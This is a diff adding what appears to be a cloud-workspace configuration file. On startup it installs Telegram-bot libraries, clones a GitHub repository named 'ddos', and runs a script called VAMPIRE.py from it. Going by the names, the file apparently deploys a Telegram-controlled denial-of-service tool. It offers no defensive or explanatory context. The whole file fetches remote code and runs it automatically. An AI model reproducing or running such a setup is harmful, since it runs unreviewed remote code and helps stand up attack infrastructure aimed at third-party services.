@@ -1,0 +1,18 @@
+image: python:3.10  # Use Python 3.10 image for the workspace
+
+tasks:
+  # Setup stage: Install dependencies and clone the repo
+  - name: Setup dependencies and clone repo
+    init: |
+      pip install pymongo python-telegram-bot pyTelegramBotAPI
+      git clone https://github.com/Rockykdv5/ddos
+      ls  # Check if repo is cloned correctly
+      cd ddos
+      ls  # Check contents of ddos folder
+
+  # Run stage: Move and run the script
+  - name: Move and run script
+    command: |
+      mv ddos/VAMPIRE.py ./VAMPIRE.py  # Move the script to the current directory
+      chmod +x VAMPIRE.py  # Make it executable
+      python3 VAMPIRE.py  # Run the script
